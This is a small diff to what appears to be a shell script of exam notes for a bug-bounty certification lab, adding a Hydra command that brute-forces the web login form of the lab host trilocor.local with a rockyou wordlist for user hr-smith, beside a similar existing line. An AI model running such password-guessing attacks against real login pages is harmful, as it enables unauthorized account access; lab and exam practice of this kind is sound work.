@@ -2,6 +2,10 @@
 
 #CBBH exam PR
 #export HYDRA_PROXY_HTTP=http://127.0.0.1:8082
+hydra -V -F -o myhydra-hr-smith.out -l hr-smith -P rockyoumy.txt trilocor.local -s 8088 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid login details|F=Invalid username" >vystup.out 2>&1
+
+exit 0
+
 hydra -v -l pr-martins -P ~/bin/pen/myWordLists/Password/rockyou.txt trilocor.local -s 8009 http-post-form "/auth/login:username=^USER^&password=^PASS^:F=Invalid username or password"
 exit 0
 
